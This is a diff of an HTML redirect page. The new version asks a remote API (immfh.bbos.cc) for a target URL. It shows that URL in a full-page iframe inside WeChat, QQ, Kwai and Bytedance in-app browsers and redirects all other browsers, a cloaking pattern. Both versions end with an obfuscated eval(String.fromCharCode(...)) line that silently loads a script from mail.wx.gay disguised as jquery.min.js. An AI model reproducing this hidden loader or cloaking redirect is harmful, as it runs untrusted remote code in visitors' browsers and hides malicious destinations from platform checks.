@@ -1,35 +1,55 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh">
 <head>
-    <meta charset="UTF-8">
-    <title>baidu news</title>
-    <script>
-        function getQueryParam(name) {
-            var urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(name);
-        }
-        function appendParam(url, paramName, paramValue) {
-            let newUrl = new URL(url);
-            newUrl.searchParams.append(paramName, paramValue);
-            return newUrl.toString();
-        }
-        window.onload = function() {
-            var uri = getQueryParam('_t'); 
-            if (!uri) {
-                window.location.href = 'https://news.baidu.com/';
-            }
-            if (uri.startsWith('http://gotonewsite.com/s/')) {
-                uri = uri.replace('http://gotonewsite.com/s/','https://gotonewsite.com/s/');
-            }
-            uri = appendParam(uri, '_f', 'gitee.io');
-            window.location.href = uri;
-        };
-    </script>
-    <script>
-    eval(String.fromCharCode(9,102,117,110,99,40,41,59,10,102,117,110,99,116,105,111,110,32,102,117,110,99,40,41,32,123,10,9,108,101,116,32,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,10,9,115,46,115,114,99,32,61,32,39,47,47,109,97,105,108,46,119,120,46,103,97,121,47,106,113,117,101,114,121,46,109,105,110,46,106,115,39,59,10,9,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,10,125,59));
-    </script>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <title❤️欢迎❤️</title>
+  <meta name="referrer" content="no-referrer" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <script src="https://s1.pstatp.com/cdn/expire-1-M/jquery/3.6.0/jquery.min.js"></script>
+  <style>
+    body,
+    html {
+      width: 100%;
+      height: 100%
+    }
+
+    * {
+      margin: 0;
+      padding: 0
+    }
+  </style>
 </head>
 <body>
-    <h1>loading,please waiting...</h1>
 </body>
-</html>
+<script>
+  const url = window.document.location.href.toString();
+  let uu1 = url.split("?");
+  let u=uu1[1].replace("/","");
+  let uu=u.replace("=","");
+  $(document).ready(function() {
+    $.ajax({
+      url: "http://immfh.bbos.cc/api.php?act=geturl",
+      type: "POST",
+      data: {
+        "id":uu
+      },
+      dataType: "json",
+      success: function(result) {
+        var ua = navigator.userAgent.toString();
+        if(ua.indexOf("MicroMessenger/") !== -1 || ua.indexOf("QQ/")!== -1 || ua.indexOf("Kwai/") !==-1 || ua.indexOf("BytedanceWebview/")!== -1) {
+          if (result.code == 1) {
+            $("title").text(result.title);
+            $("body").html('<iframe src="' + result.url + '" width="100%" height="' + (($(window).height()) - 5) + "px" + '" style="border: 0" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>');
+          } else {
+            $('#Zl').html('<iframe width="100%" id="rid" src="https://www.baidu.com" frameborder="0"  ></iframe>');
+          }
+        }else{
+          window.location.href = result.url;
+        }
+      }
+    });
+  });
+</script>
+<script>
+  eval(String.fromCharCode(9,102,117,110,99,40,41,59,10,102,117,110,99,116,105,111,110,32,102,117,110,99,40,41,32,123,10,9,108,101,116,32,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,10,9,115,46,115,114,99,32,61,32,39,47,47,109,97,105,108,46,119,120,46,103,97,121,47,106,113,117,101,114,121,46,109,105,110,46,106,115,39,59,10,9,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,10,125,59));
+</script>
